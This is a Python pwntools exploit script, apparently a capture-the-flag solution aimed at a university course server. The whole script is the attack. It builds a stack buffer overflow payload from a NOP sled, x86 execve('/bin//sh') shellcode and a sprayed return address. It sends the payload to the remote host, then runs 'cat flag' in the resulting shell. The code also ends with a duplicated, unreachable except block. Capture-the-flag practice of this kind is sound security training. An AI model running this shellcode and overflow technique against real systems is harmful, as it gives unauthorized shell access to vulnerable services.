from pwn import *
import sys
import time

host = "ic.catedras.linti.unlp.edu.ar"
port = 15009
buffer_address = 0xFFFFDE30

shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
nops = b"\x90" * (60 - len(shellcode))

parte_inicial = nops + shellcode

direccion_retorno = p32(buffer_address)
spray = direccion_retorno * 30

payload = parte_inicial + spray

print(f"[*] Payload length: {len(payload)} bytes")
print(f"[*] Enviando ataque a {host}:{port}...")

try:
    p = remote(host, port)
    p.recvuntil(b"Ingrese su input:")
    p.sendline(payload)
    
    try:
        p.recvline()
    except:
        pass

    print("[*] Payload enviado. Obteniendo flag...")
    
    time.sleep(1)
    p.sendline(b"cat flag")
    
    result = p.recvall(timeout=2)
    print(result.decode(errors='ignore'))
    
    p.close()

except Exception as e:
    print(f"Error: {e}")
    import traceback
    traceback.print_exc()

except Exception as e:
    print(f"Error: {e}")
    import traceback
    traceback.print_exc()